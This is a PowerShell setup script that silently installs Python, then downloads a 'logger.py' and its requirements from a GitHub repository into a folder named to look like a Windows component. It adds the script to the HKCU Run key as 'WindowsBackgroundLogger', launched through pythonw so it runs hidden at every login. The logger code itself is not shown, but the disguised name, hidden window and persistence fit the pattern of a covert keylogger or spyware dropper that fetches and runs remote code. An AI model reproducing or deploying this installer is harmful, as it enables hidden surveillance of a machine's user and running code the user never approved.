# =============================================
#   Windows Automated Background Logger Setup
# =============================================

$installDir = "$env:LOCALAPPDATA\WindowsLogger"
if (!(Test-Path $installDir)) { 
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null 
}

$loggerUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/logger.py"
$reqUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/requirements.txt"

Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "   Automated Logger Setup Process" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan

# 1. Check Python
Write-Host "[*] Checking for Python..." -ForegroundColor Yellow
$pythonInstalled = $false

if (Get-Command python -ErrorAction SilentlyContinue) {
    $pythonVersion = & python --version
    Write-Host "[+] Python is already installed: $pythonVersion" -ForegroundColor Green
    $pythonInstalled = $true
}

if (-not $pythonInstalled) {
    Write-Host "[-] Python not found. Downloading Python 3.12.8..." -ForegroundColor Yellow
    $pythonUrl = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"
    
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    
    Write-Host "[*] Installing Python silently..." -ForegroundColor Yellow
    $installArgs = "/quiet PrependPath=1 Include_test=0 Include_pip=1"
    Start-Process -FilePath $installerPath -ArgumentList $installArgs -Wait -PassThru | Out-Null
    
    Remove-Item $installerPath -Force
    
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    Write-Host "[+] Python installed successfully!" -ForegroundColor Green
}

# 2. Download files
Write-Host "[*] Downloading script files..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $loggerUrl -OutFile "$installDir\logger.py" -TimeoutSec 30
    Invoke-WebRequest -Uri $reqUrl -OutFile "$installDir\requirements.txt" -TimeoutSec 30
    Write-Host "[+] Files downloaded successfully." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download files! Check your internet connection." -ForegroundColor Red
    Exit
}

# 3. Install requirements (Improved with better error handling)
Write-Host "[*] Installing required Python packages..." -ForegroundColor Yellow
Set-Location $installDir

# Improve pip reliability
python -m pip install --upgrade pip --quiet
python -m pip install --upgrade setuptools wheel --quiet

# Main install with retry-friendly options
$pipArgs = "-r requirements.txt --no-cache-dir --timeout 120 --retries 5 --quiet"
$installResult = python -m pip install $pipArgs

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] All packages installed successfully." -ForegroundColor Green
} else {
    Write-Host "[!] Installation had issues. Trying alternative method..." -ForegroundColor Yellow
    python -m pip install -r requirements.txt --no-cache-dir --timeout 180 --retries 10
}

# 4. Add to Windows Startup
Write-Host "[*] Setting up Windows Startup..." -ForegroundColor Yellow

$pythonwPath = (Get-Command pythonw -ErrorAction SilentlyContinue).Source
if (-not $pythonwPath) {
    $pythonwPath = "$env:USERPROFILE\AppData\Local\Programs\Python\Python312\pythonw.exe"
    if (!(Test-Path $pythonwPath)) {
        $pythonwPath = "pythonw"
    }
}

$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$shortcutCommand = "`"$pythonwPath`" `"$installDir\logger.py`""

Set-ItemProperty -Path $runKey -Name "WindowsBackgroundLogger" -Value $shortcutCommand -ErrorAction SilentlyContinue

Write-Host "=============================================" -ForegroundColor Green
Write-Host "[✓] Setup completed successfully! Logger is now active." -ForegroundColor Green
Write-Host "[i] Installation folder: $installDir" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Green
